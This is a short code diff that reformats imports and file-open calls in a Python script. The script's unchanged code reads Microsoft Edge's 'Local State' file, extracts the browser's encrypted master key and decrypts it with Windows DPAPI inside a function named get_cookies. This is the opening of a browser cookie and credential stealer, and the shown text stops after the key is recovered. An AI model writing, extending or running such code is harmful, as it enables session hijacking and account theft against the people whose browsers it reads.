@@ -1,6 +1,13 @@
-import os, json, base64, sqlite3, shutil, ctypes
+import base64
+import ctypes
+import json
+import os
+import shutil
+import sqlite3
 from ctypes import wintypes
+
 from Crypto.Cipher import AES
+
 
 class DATA_BLOB(ctypes.Structure):
     _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
@@ -16,7 +23,7 @@ def dpapi_decrypt(encrypted_bytes):
 
 def get_cookies():
     local_state_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Local State'
-    with open(local_state_path, 'r', encoding='utf-8') as f:
+    with open(local_state_path, encoding='utf-8') as f:
         local_state = json.load(f)
     encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
     aes_key = dpapi_decrypt(encrypted_key)
